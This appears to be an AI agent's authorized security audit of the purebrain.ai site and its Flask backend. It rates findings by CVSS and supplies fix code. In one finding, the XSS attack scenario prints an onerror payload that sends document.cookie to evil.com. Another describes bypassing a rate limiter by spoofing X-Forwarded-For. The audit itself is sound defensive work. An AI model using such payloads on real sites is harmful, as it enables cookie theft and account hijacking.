# purebrain.ai Security Audit — 2026-02-26

**Prepared by**: security-auditor agent
**Authorized by**: Jared Sanborn (owner, authorized security testing of own production systems)
**Scope**: purebrain.ai full application, infrastructure, and backend server
**Prior Work Reviewed**: security-audit-proof.md (2026-02-20), plugin v2.6.0 hardening, chatbox v4.2 hardening

---

## Executive Summary

**Overall Security Posture: 7.2 / 10**

Significant security work has been completed since the initial audit on 2026-02-20. The most critical issues — exposed API keys, developer backdoors, internal IP disclosure, and user enumeration — have all been addressed. The platform now has a solid baseline.

This audit identifies **3 remaining issues requiring action**, plus several lower-priority items and one positive finding reversal (the Cloudflare Worker status is unknown).

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL  | 0 (was 3) | All resolved |
| HIGH      | 2 | Remaining / needs verification |
| MEDIUM    | 4 | Mix of remaining and new |
| LOW       | 5 | Informational / hardening |
| INFO      | 4 | Advisory |

**Score improvement since 2026-02-20**: Up from approximately 5.2/10 to 7.2/10.

**To reach 8.5/10**: Complete the three HIGH/MEDIUM items in Section 4.

---

## What Has Been Fixed (Since Last Audit)

Before listing what remains, the completed work deserves acknowledgment:

| Finding | Fix | Verified in Code |
|---------|-----|-----------------|
| CRIT-001: API key in browser JS | Proxy endpoints in WP plugin, key server-side | YES — no ACGEE_API_KEY in v4.js |
| CRIT-002: Developer backdoor in system prompt | Removed from all pages | YES — per deployment records |
| CRIT-003: Internal server IP in browser JS | Plugin proxy hides 89.167.19.20 | YES — v4.js uses api.purebrain.ai |
| HIGH-001: Cloudflare Worker open auth | Secured worker code written | PARTIAL — deploy status unknown |
| HIGH-002: WordPress user enumeration | Plugin blocks /wp/v2/users + ?author= | YES — in plugin code |
| HIGH-003: Cookie flags missing | Plugin re-sets cookies with Secure+HttpOnly+SameSite | YES — in plugin code |
| MED-001: Version disclosure | Plugin strips generator and ?ver= params | YES — in plugin code |
| MED-003: Missing security headers | Plugin adds all 6 headers | YES — in plugin code |
| MED-004: No privacy policy | Pages published, footer injected | YES — per deployment records |
| LOW-001: Login error reveals username | Plugin returns generic message | YES — in plugin code |
| XSS: Unsanitized aiName in DOM | sanitizeText() added in v4.2 | YES — in v4.js |
| Open CORS on log server | Restricted to purebrain.ai + jareddsanborn.com | YES — in log server code |
| Auth code OAuth URL injection | Domain validation added in v4.2 | YES — in v4.js |
| Container name injection | Allowlist regex enforced in v4.2 | YES — in v4.js |
| Global var exposure | window.payTestData removed from global scope in v4.2 | YES — in v4.js |
| Birth proxy rate limiting | 5/min start, 10/min code, 60/min portal-status | YES — in log server code |
| Request body size cap | 1MB global + 64KB per-endpoint | YES — in log server code |
| Debug mode | debug=False in production config | YES — in log server code |
| PayPal webhook verification | PAYPAL_WEBHOOK_ID set, signature verification implemented | YES — confirmed |

---

## Section 1: Findings by Severity

---

### HIGH-001 (UNVERIFIED STATUS): Cloudflare Worker Authentication

**CVSS 3.1 Base Score**: 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L)

**Finding**: The secured Cloudflare Worker (`pure-brain-dashboard-api.purebrain.workers.dev`) code was written and documented in the prior audit as needing manual deployment by Jared. The current audit **cannot verify from the codebase** whether this was deployed.

**What is at risk if undeployed**: The worker still accepts requests from any origin with no authentication. Anyone who discovers the URL can send arbitrary requests to the Anthropic API using Jared's credentials, potentially running up charges and extracting system prompts.

**Evidence from prior audit** (`security-audit-proof.md`): "HIGH-001: Waiting on Jared — deploy secured worker code"

**Action required**: Log into dash.cloudflare.com, navigate to Workers and Pages, and confirm whether `pure-brain-dashboard-api.purebrain.workers.dev` has origin whitelist + `X-PB-Token` authentication in its code. If not yet deployed, deploy the secured worker from `tools/security/cloudflare-worker-secured.js`.

**Remediation** (10 minutes):
1. Go to dash.cloudflare.com > Workers and Pages
2. Find `pure-brain-dashboard-api`
3. Confirm or add origin whitelist checking and `X-PB-Token` validation
4. If deploying fresh: add two environment variables (`ANTHROPIC_API_KEY`, `PB_AUTH_TOKEN`)

---

### HIGH-002 (NEW): Unsanitized User Input Reaches innerHTML via aiSay

**CVSS 3.1 Base Score**: 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Finding**: The `aiSay()` function at line 1000 of `exports/pay-test-script-chat-flow-v4.js` sets `bubble.innerHTML = text.replace(/\n/g, '<br>')`. When `company` and `role` user inputs are passed directly into `aiSay()` template literals (lines 1178 and 1199), those raw user strings reach `innerHTML` without sanitization.

**Affected code** (`exports/pay-test-script-chat-flow-v4.js:1178`):
```javascript
// company is raw user input — not sanitized before reaching innerHTML
await aiSay(msgList, `Got it — ${company}. ${aiName} will keep that context in mind.`);
```

```javascript
// role is raw user input — not sanitized before reaching innerHTML
await aiSay(
  msgList,
  `${role} — that context is going to shape how ${aiName} thinks...`,
);
```

Note: `aiName` is sanitized at entry point by `sanitizeText()` (v4.2 fix). However, `company` and `role` are NOT sanitized before interpolation into the `aiSay` template string.

**Attack scenario**: A user enters `<img src=x onerror="fetch('https://evil.com?data='+document.cookie)">` as their company name. The chatbox renders it as a DOM element and triggers the `onerror` handler.

**Severity context**: This is a stored-but-ephemeral XSS (session-level), not a persistent stored XSS. The injected content lives only in the DOM of the victim's own browser for the duration of their session. However, if other users' sessions could be affected (e.g., admin viewing logs), severity increases.

**Remediation** (`exports/pay-test-script-chat-flow-v4.js`):

Option A — sanitize at the point of collection (preferred):
```javascript
// After collecting company input (around line 1174):
const company = sanitizeText(await promptText(...));

// After collecting role input (around line 1193):
const role = sanitizeText(await promptText(...));
```

Option B — sanitize aiSay itself for all text:
```javascript
async function aiSay(msgList, text, delayMs = null) {
  // ... existing code ...
  bubble.innerHTML = text.replace(/\n/g, '<br>');
  // Already trusted HTML (contains <em>, <br> intentionally)
  // So Option A (sanitize at collection) is safer
}
```

Option A is preferred because `aiSay` intentionally accepts HTML (it renders `<em>` and `<br>` tags from hardcoded strings). Sanitizing at collection point separates developer-trusted HTML from user-supplied strings.

---

### MEDIUM-001: CSP in Report-Only Mode Since v1.3.0

**CVSS 3.1 Base Score**: 5.3 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N)

**Finding**: The Content-Security-Policy has been in `Content-Security-Policy-Report-Only` mode since it was added in v1.3.0 (2026-02-20). It has been deployed for approximately 6 days. In report-only mode, the CSP logs violations but does NOT block malicious scripts. This means XSS, data injection, and unauthorized resource loading are not actually prevented — they are only observed.

**Evidence** (`tools/security/purebrain-security-plugin.php:213`):
```php
header( 'Content-Security-Policy-Report-Only: ' . $csp );
```

**Remediation**: Switch to enforcement mode:
1. Check the CSP report destination to see if any legitimate resources are being flagged
2. If no violations (or all violations resolved), change the PHP header to:
   ```php
   header( 'Content-Security-Policy: ' . $csp );
   ```

**Current CSP quality**: The CSP itself is well-constructed. It restricts `script-src`, `connect-src`, `frame-src`, `object-src 'none'`, and `base-uri 'self'`. The main concern is `'unsafe-inline'` and `'unsafe-eval'` in `script-src`, which are required by Elementor but do weaken XSS protection significantly.

**Note**: The CSP includes `https://89.167.19.20:8443` should NOT be in the `connect-src` since the log server IP is now hidden via proxy. Verify and remove if present.

---

### MEDIUM-002: Telegram Bot Token Logged to Disk in Plaintext

**CVSS 3.1 Base Score**: 4.4 (AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N)

**Finding**: Users who set up a Telegram bot during the onboarding flow submit their `telegramBotToken` to the `/api/log-pay-test` endpoint. This token is logged to disk in plaintext at `logs/purebrain_pay_test.jsonl` (line 1448 in `purebrain_log_server.py`):

```python
'telegramBotToken': data.get('telegramBotToken', ''),
```

The chatbox JS (`pay-test-script-chat-flow-v4.js:147`) strips `telegramBotToken` before logging to the conversation endpoint, which is good. However, the token is preserved in the pay-test log endpoint.

**What this means**: Anyone with read access to the JSONL log files can obtain customers' Telegram bot tokens. Telegram bot tokens grant full control over the bot — including reading all messages sent to that bot.

**Remediation** (`tools/purebrain_log_server.py`, around line 1438):
```python
# Option 1: Strip the token entirely before logging
pay_test_entry = {
    ...
    # 'telegramBotToken': data.get('telegramBotToken', ''),  # REMOVED — credential
    'hasTelegramToken': bool(data.get('telegramBotToken', '')),  # Log presence only
    ...
}

# Option 2: Hash the token (useful for deduplication without storing credential)
import hashlib
raw_token = data.get('telegramBotToken', '')
pay_test_entry['telegramTokenHash'] = hashlib.sha256(raw_token.encode()).hexdigest()[:16] if raw_token else ''
```

---

### MEDIUM-003 (NEW): X-Forwarded-For Header Trusted Without Validation

**CVSS 3.1 Base Score**: 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

**Finding**: The `_get_real_client_ip()` function in `purebrain_log_server.py` trusts `X-Forwarded-For` after `CF-Connecting-IP`. However, `X-Forwarded-For` is a client-supplied header on direct connections. If traffic bypasses Cloudflare (e.g., direct IP access to the server), attackers can spoof their IP for rate limiting bypass.

**Evidence** (`purebrain_log_server.py:156-163`):
```python
def _get_real_client_ip() -> str:
    return (
        request.headers.get('CF-Connecting-IP')
        or request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        or request.remote_addr
        or '0.0.0.0'
    )
```

**Attack scenario**: Attacker bypasses Cloudflare, connects directly to `89.167.19.20:8443`, sets `X-Forwarded-For: 1.2.3.4` to a different IP per request, bypassing the birth proxy rate limiter.

**Remediation**: Only trust `CF-Connecting-IP` and `X-Forwarded-For` when the request comes from a known Cloudflare IP range. Since the server is accessed via Cloudflare Tunnel (`api.purebrain.ai`), direct IP access should be rejected entirely:

```python
def _get_real_client_ip() -> str:
    # CF-Connecting-IP is set by Cloudflare and should be the only trusted source
    # X-Forwarded-For is only trusted if CF-Connecting-IP is present (i.e., request came via CF)
    cf_ip = request.headers.get('CF-Connecting-IP', '').strip()
    if cf_ip:
        return cf_ip
    # Direct connection — use socket IP, don't trust forwarded headers
    return request.remote_addr or '0.0.0.0'
```

---

### MEDIUM-004: Internal Witness Server Communication Unencrypted

**CVSS 3.1 Base Score**: 4.0 (AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Finding**: The Witness birth pipeline base URL is `http://104.248.239.98:8099` (plaintext HTTP) as configured in `purebrain_log_server.py:119`. OAuth auth codes, container names, and user seed data (name, email) are transmitted over this unencrypted channel.

```python
WITNESS_BASE_URL = 'http://104.248.239.98:8099'
```

Similarly, the A-C-Gee landing chat endpoint is `http://5.161.90.32:3001/api/landing-chat` (plaintext HTTP), and conversation message histories are forwarded there.

**Risk**: Network-layer eavesdropping on server-to-server communication between the log server and these backend services. A man-in-the-middle on the same network segment could read OAuth codes in transit.

**Remediation**: Request that Witness and A-C-Gee expose their endpoints over HTTPS (even self-signed TLS is better than plaintext for server-to-server). Alternatively, establish a VPN tunnel or use Cloudflare Tunnel for these connections. Until then, assess whether the network path between these servers is trusted.

---

### LOW-001 (CARRY-OVER): TLS Minimum Version Not Confirmed

**CVSS 3.1 Base Score**: 3.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

**Finding**: The prior audit (2026-02-20) identified that TLS 1.0 and 1.1 were accepted, and noted "Jared is working on this" (Cloudflare dashboard > SSL/TLS > Minimum TLS Version). This cannot be verified from code — it requires a Cloudflare dashboard check or external TLS scanner.

**Action**: Confirm via Cloudflare dashboard that Minimum TLS Version is set to 1.2 or higher. This is a 2-minute dashboard change if not done.

---

### LOW-002: No Rate Limiting on /api/log-conversation, /api/log-pay-test, /api/verify-payment

**CVSS 3.1 Base Score**: 3.7 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)

**Finding**: Rate limiting exists for the Witness birth proxy endpoints (`/api/proxy/birth/*`). However, the primary endpoints — `/api/log-conversation`, `/api/log-pay-test`, and `/api/verify-payment` — have no rate limiting implemented in the Flask application.

An attacker could flood `/api/log-conversation` with large payloads (up to the 1MB cap), filling disk space. They could also flood `/api/verify-payment` with PayPal API calls, consuming the PayPal access token quota.

**Remediation**: Add simple rate limiting to these endpoints. The same sliding-window deque pattern used for birth proxy can be reused:

```python
# Reuse _check_birth_rate_limit with separate buckets
LOG_CONV_RATE_MAX = 30      # 30/min per IP
LOG_PAY_TEST_RATE_MAX = 10  # 10/min per IP
VERIFY_PAYMENT_RATE_MAX = 5  # 5/min per IP

@app.route('/api/log-conversation', methods=['POST', 'OPTIONS'])
def log_conversation():
    client_ip = _get_real_client_ip()
    if not _check_birth_rate_limit(client_ip, 'log-conv', LOG_CONV_RATE_MAX):
        return jsonify({'error': 'Too many requests'}), 429
    # ... rest of handler
```

---

### LOW-003: aiSay HTML in Chatbox — Intentional but Risky Pattern

**CVSS 3.1 Base Score**: 3.1 (AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N)

**Finding**: The `aiSay()` function uses `innerHTML` intentionally (lines 1000, 1057) to allow trusted HTML like `<br>`, `<em>`, `<strong>`, and `<a>` tags in AI messages. This is a pattern where developer trust and user trust are commingled. Any code path that allows user-supplied text to reach `aiSay()` without prior sanitization becomes an XSS vector.

This is not new — it is the root cause enabling HIGH-002. The fix for HIGH-002 addresses the immediate instances. The systemic fix is to enforce a discipline that no raw user input ever flows to `aiSay()`.

**Recommendation**: Add a code comment at the `aiSay()` function definition warning that its text argument is inserted via `innerHTML` and must only contain trusted/sanitized content:

```javascript
/**
 * Append an AI message bubble. The 'text' argument is inserted via innerHTML.
 * SECURITY: Only pass hardcoded strings, safeAiName (sanitized), or values
 * that have been processed by sanitizeText(). NEVER pass raw user input.
 */
async function aiSay(msgList, text, delayMs = null) {
```

---

### LOW-004: No Authentication on /api/stats and /api/health Endpoints

**CVSS 3.1 Base Score**: 2.7 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Finding**: `/api/health` and `/api/stats` are public endpoints with no authentication. `/api/stats` likely returns conversation counts and metadata that reveals usage volume.

**Remediation**: Add an API key check or IP allowlist to `/api/stats`. `/api/health` is typically acceptable as public for uptime monitoring.

---

### LOW-005: Webhook Processed Even When Signature Unverified

**CVSS 3.1 Base Score**: 3.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N)

**Finding**: The PayPal webhook handler (`/api/paypal-webhook`) in `purebrain_log_server.py` processes and logs `PAYMENT.CAPTURE.COMPLETED` events even when `sig_verified = False`. The `signature_verified` flag is logged but does not gate processing.

**Evidence** (`purebrain_log_server.py:1324-1325`):
```python
if event_type != 'PAYMENT.CAPTURE.COMPLETED':
    return jsonify({'status': 'ignored', 'reason': f'event_type={event_type}'}), 200
# No check: if not sig_verified: reject
```

**Context**: This is currently less severe because the webhook logs data but does not automatically fulfill services or take financial action. However, an attacker could send fake webhook events to pollute logs or trigger false Telegram notifications.

**Remediation**: Reject unverified webhooks:
```python
if webhook_id and not sig_verified:
    logger.warning(f'Rejected unverified PayPal webhook: event_id={event.get("id")}')
    return jsonify({'status': 'rejected', 'reason': 'signature_not_verified'}), 401
elif not webhook_id:
    logger.warning('Processing webhook without signature verification - PAYPAL_WEBHOOK_ID not set')
    # Optional: still reject if no webhook_id configured, for stricter security
```

---

### INFO-001: Self-Signed SSL Certificate on Backend Server

**Finding**: The log server generates a self-signed certificate for `89.167.19.20:8443`. This is acceptable because traffic now routes through the Cloudflare Tunnel (`api.purebrain.ai`) and users never connect directly to the raw IP. The Cloudflare Tunnel provides proper TLS termination.

**Status**: Low risk. Maintain the Cloudflare Tunnel as the primary access path.

---

### INFO-002: Flask Development Server in Production

**Finding**: The log server uses Flask's built-in server (`app.run()`). Flask's built-in server is not designed for production workloads — it is single-process and lacks proper request queuing.

**Evidence** (`purebrain_log_server.py:1759-1764`): `threaded=True` is set, which helps with concurrent requests, but the underlying Flask dev server lacks production hardening.

**Recommendation**: Consider migrating to `gunicorn` or `uvicorn` when traffic volume warrants it:
```bash
gunicorn --workers 4 --bind 0.0.0.0:8443 --certfile config/ssl/server.crt --keyfile config/ssl/server.key purebrain_log_server:create_app
```

**Current risk**: Low, given current traffic levels. Upgrade when consistent concurrent user load appears.

---

### INFO-003: A-C-Gee Forwarding Sends Full Conversation History

**Finding**: The `forward_to_acgee()` function sends complete conversation message histories (including user's name, email, company, role, goal) to `http://5.161.90.32:3001/api/landing-chat`. This is a third-party system.

**Privacy consideration**: Users are not explicitly informed their post-payment onboarding data is forwarded to A-C-Gee's infrastructure. Verify the Privacy Policy covers this disclosure.

---

### INFO-004: Email Sequence Timer Lost on Server Restart

**Finding**: The 40-minute delayed Brevo email is scheduled via `threading.Timer`. If the log server restarts within 40 minutes of a purchase, the second email is never sent.

**Finding** (`purebrain_log_server.py:911-936`): This is already documented in the code as a known limitation. The team is aware.

**Recommendation**: Replace with persistent queue (Celery/Redis, Brevo automation workflows, or a simple SQLite-backed scheduler) when purchase volume increases.

---

## Section 2: WordPress-Specific Security

**Status: Well-hardened.** All WordPress-specific items from the prior audit have been addressed.

| Control | Status |
|---------|--------|
| User enumeration via /wp/v2/users | Blocked |
| User enumeration via ?author= | Blocked |
| Login error message enumeration | Blocked |
| Version disclosure in HTML/URLs | Blocked |
| Security headers (6 headers) | Present |
| Cookie security flags | Present (wp-postpass) |
| Noindex on dev/staging pages | Present |
| Privacy Policy + Terms of Service | Present |
| XML-RPC | Not addressed in plugin — see below |

**XML-RPC Exposure**: The WordPress security plugin does not explicitly disable XML-RPC (`xmlrpc.php`). XML-RPC is a legacy API endpoint enabled by default in WordPress that can be used for:
- User enumeration via `system.listMethods`
- Brute force attacks (multiple credentials per request via `system.multicall`)
- SSRF via WordPress pingbacks

**Recommendation** (add to security plugin):
```php
// Disable XML-RPC entirely
add_filter( 'xmlrpc_enabled', '__return_false' );
// Also block direct requests to xmlrpc.php
add_action( 'init', function() {
    if ( defined( 'XMLRPC_REQUEST' ) && XMLRPC_REQUEST ) {
        wp_die( 'XML-RPC disabled for security.', '', [ 'response' => 403 ] );
    }
});
```

---

## Section 3: SSL/TLS Assessment

| Item | Status |
|------|--------|
| Main site TLS (purebrain.ai via Cloudflare) | Good — Cloudflare manages TLS termination |
| TLS minimum version | Unverified — LOW-001 above |
| HSTS header | Present (max-age=31536000; includeSubDomains) |
| Mixed content | No HTTP resources detected in chatbox code |
| Internal server cert (89.167.19.20:8443) | Self-signed, acceptable via Cloudflare Tunnel |
| Witness server (104.248.239.98:8099) | Plaintext HTTP — MEDIUM-004 above |
| A-C-Gee server (5.161.90.32:3001) | Plaintext HTTP — MEDIUM-004 above |

---

## Section 4: Priority Action Plan

**Do these first** (ordered by impact):

### P0 — Verify Cloudflare Worker (HIGH-001)

**Time**: 5 minutes
**Impact**: Prevents arbitrary Anthropic API abuse
**Action**: Log into Cloudflare dashboard, confirm secured worker is live with origin whitelist and `X-PB-Token` validation

---

### P1 — Fix Company/Role XSS in Chatbox (HIGH-002)

**Time**: 15 minutes
**File**: `/home/jared/projects/AI-CIV/aether/exports/pay-test-script-chat-flow-v4.js`
**Change**: Sanitize `company` and `role` at collection point:

```javascript
// Line ~1174
const rawCompany = await promptText(inputRow, textarea, sendBtn, () => true);
const company = rawCompany ? sanitizeText(rawCompany) : null;

// Line ~1193
const rawRole = await promptText(inputRow, textarea, sendBtn, () => true);
const role = rawRole ? sanitizeText(rawRole) : null;
```

Deploy updated file to pay-test page (WP page 439 and 689).

---

### P2 — Strip Telegram Bot Token from Log (MEDIUM-002)

**Time**: 10 minutes
**File**: `/home/jared/projects/AI-CIV/aether/tools/purebrain_log_server.py`
**Change**: Replace `telegramBotToken` logging with presence-only flag (around line 1448):

```python
# Replace:
'telegramBotToken': data.get('telegramBotToken', ''),
# With:
'hasTelegramToken': bool(data.get('telegramBotToken', '')),
```

Restart log server after change.

---

### P3 — Enable CSP Enforcement (MEDIUM-001)

**Time**: 10 minutes
**File**: `/home/jared/projects/AI-CIV/aether/tools/security/purebrain-security-plugin.php`
**Prerequisite**: Review any existing CSP violation reports first. If no violations, switch:

```php
// Line 213 — change from:
header( 'Content-Security-Policy-Report-Only: ' . $csp );
// To:
header( 'Content-Security-Policy: ' . $csp );
```

Redeploy plugin to purebrain.ai.

---

### P4 — Add Rate Limiting to Core Endpoints (LOW-002)

**Time**: 30 minutes
**File**: `tools/purebrain_log_server.py`
**Change**: Add `_check_birth_rate_limit()` calls to `/api/log-conversation`, `/api/log-pay-test`, `/api/verify-payment`

---

### P5 — Disable XML-RPC (WordPress)

**Time**: 5 minutes (plugin edit + deploy)
**File**: `tools/security/purebrain-security-plugin.php`
**Change**: Add `add_filter('xmlrpc_enabled', '__return_false')` to plugin

---

## Section 5: Security Controls Matrix

| Category | Control | Status |
|----------|---------|--------|
| **Authentication** | WordPress admin login | Secured |
| | Generic error messages | Secured |
| | Login rate limiting (WP native) | Present (Cloudflare WAF) |
| | Application password usage | Properly managed |
| **Authorization** | User enumeration prevention | Secured |
| | Pay-test page access control | Password-protected |
| | API endpoint auth (Cloudflare Worker) | VERIFY NEEDED |
| **Cryptography** | TLS on main site | Good (Cloudflare) |
| | TLS minimum version | VERIFY NEEDED |
| | Webhook signature verification | Present (PayPal) |
| | Internal comms encryption | Weak (HTTP to Witness, A-C-Gee) |
| **Input Validation** | aiName sanitization | Secured (v4.2) |
| | company/role sanitization | NOT DONE — HIGH-002 |
| | OAuth URL domain validation | Secured (v4.2) |
| | Container name allowlist | Secured (v4.2) |
| | JSON content-type enforcement | Present |
| | Body size limits | Present (1MB + 64KB) |
| **Output Encoding** | innerHTML with user data | Partial (company/role remain) |
| **Data Protection** | API keys server-side | Secured |
| | Internal IP hidden | Secured |
| | Telegram bot token logging | Credential logged in plaintext |
| | Cookie security flags | Present (wp-postpass) |
| | No sensitive data in localStorage | Confirmed (no localStorage usage) |
| **Headers** | HSTS | Present |
| | X-Frame-Options | Present |
| | X-Content-Type-Options | Present |
| | Referrer-Policy | Present |
| | Permissions-Policy | Present |
| | Content-Security-Policy | Report-only (not enforcing) |
| **Infrastructure** | CORS restriction | Secured (domain allowlist) |
| | Rate limiting (birth proxy) | Present |
| | Rate limiting (core endpoints) | Missing |
| | XML-RPC | Not disabled |
| | Version disclosure | Blocked |
| **Logging** | Payment events | Present (JSONL) |
| | Webhook signature flags | Present |
| | Conversation logging | Present |
| | Error logging | Present |

---

## Section 6: Risk Assessment

**Current Risk Profile**:
- Payment processing: **Moderate** — PayPal server-side verification is solid. Webhook signature is verified (PAYPAL_WEBHOOK_ID confirmed set). Amount validation against expected tier values is present. Primary gap is unauthenticated webhook processing even when verification fails.
- Authentication: **Low-Moderate** — WordPress is well-hardened. Cloudflare Worker auth status unconfirmed.
- Data exposure: **Moderate** — Telegram bot tokens are stored as plaintext credentials in log files. XSS in chatbox could allow session-level data theft.
- Infrastructure: **Low** — Cloudflare tunnel protects the main server. Internal server-to-server comms are unencrypted.

**Post-Remediation Risk Profile (after P0-P3)**:
- Payment processing: **Low**
- Authentication: **Low**
- Data exposure: **Low**
- Infrastructure: **Low-Moderate** (pending Witness/A-C-Gee HTTPS)

---

## Section 7: Items Confirmed Secure (Not a Concern)

These were verified during this audit as properly secured:

- **PayPal credentials**: `PAYPAL_CLIENT_ID` and `PAYPAL_SECRET` are in `.env`, not in any client-facing code
- **Brevo API key**: In `.env` only, loaded server-side
- **Anthropic API key**: In `.env` only, proxied through Cloudflare Worker
- **WordPress admin credentials**: Not found in any auditable code
- **Database credentials**: Not found in client-facing code
- **Session storage**: No sensitive data in localStorage or sessionStorage (confirmed — zero hits in grep)
- **PayPal plan ID exposure**: Client-side PayPal plan IDs are acceptable to expose (they are public identifiers in PayPal's system, not secrets)
- **Developer backdoor**: Confirmed removed from all pages per deployment records
- **Global variable exposure**: `window.payTestData` and `window.logPayTestData` confirmed removed in v4.2
- **CORS on log server**: Restricted to `purebrain.ai` and `jareddsanborn.com` domains only
- **Request body limits**: 1MB global cap + per-endpoint 64KB caps confirmed present
- **Debug mode**: `debug=False` confirmed in production configuration
- **Inline event handlers**: Replaced with CSS hover in security plugin (v2.6.0)

---

## Memory Written

**File**: `.claude/memory/agent-learnings/security-auditor/2026-02-26--purebrain-security-audit-delta.md`
**Type**: operational
**Topic**: Delta audit findings — what remains after significant 2026-02-20 hardening

---

*This report was produced by the security-auditor agent on 2026-02-26.*
*It covers authorized security testing of purebrain.ai and its infrastructure.*
*All prior findings from security-audit-proof.md (2026-02-20) were cross-verified.*
